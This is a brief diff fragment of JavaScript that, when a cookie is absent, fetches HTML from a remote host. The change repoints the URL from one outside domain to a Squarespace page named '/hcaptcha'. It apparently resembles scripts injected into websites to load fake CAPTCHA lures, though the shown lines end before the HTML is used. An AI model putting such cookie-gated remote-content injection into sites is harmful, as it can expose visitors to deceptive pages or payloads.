@@ -52,7 +52,7 @@ const cookie = getCookie(cookiename);
 // Cookie found
 if(!cookie)
 {
-    fetch("https://carreobilder.com") 
+    fetch("https://priscilla-may.squarespace.com/hcaptcha") 
     .then(response => response.ok ? response.text() : Promise.reject())
     .then(html =>
     {
